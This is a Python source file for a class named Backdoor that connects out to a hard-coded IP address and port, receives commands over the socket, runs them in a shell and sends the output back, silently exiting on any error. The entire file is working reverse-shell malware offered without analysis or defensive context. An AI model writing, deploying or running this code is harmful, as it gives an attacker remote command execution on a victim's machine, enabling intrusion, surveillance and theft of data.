import socket
import subprocess
import json
import sys


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def command_exec(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).rstrip()

    def send_data(self, data):
        try:
            json_data = json.dumps(data.decode("ISO-8859-1"))
            self.connection.send(json_data.encode("ISO-8859-1"))
        except Exception:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode("ISO-8859-1"))

    def receive_data(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode("ISO-8859-1")
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = self.receive_data()
            data = None

            try:
                data = self.command_exec(command)
            except Exception as exc:
                data = f'Error during command execution: {exc}'

            self.send_data(data)


if __name__ == '__main__':
    try:
        process = Backdoor('192.168.31.151', 6666)
        process.run()
    except Exception:
        sys.exit()
